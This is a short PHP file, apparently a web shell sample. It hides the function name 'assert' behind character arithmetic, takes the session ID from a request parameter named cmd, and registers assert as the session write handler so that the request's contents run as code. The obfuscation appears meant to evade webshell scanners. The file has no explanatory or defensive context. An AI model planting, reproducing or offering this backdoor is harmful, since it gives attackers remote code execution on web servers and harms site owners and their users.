<?php
//test
    $id = 'asser'.chr(16+100);
    echo $id;
    function open($save_path, $session_name) {
    }
       function close() {
    }
    session_id($_REQUEST[cmd]);
    function write($id, $sess_data) {
    }
    function destroy($id) {
    }
    function gc() {
    }
    function read($id){
    }
    session_set_save_handler("open", "close", 'read', $id, "destroy", "gc");
    @session_start();
?>
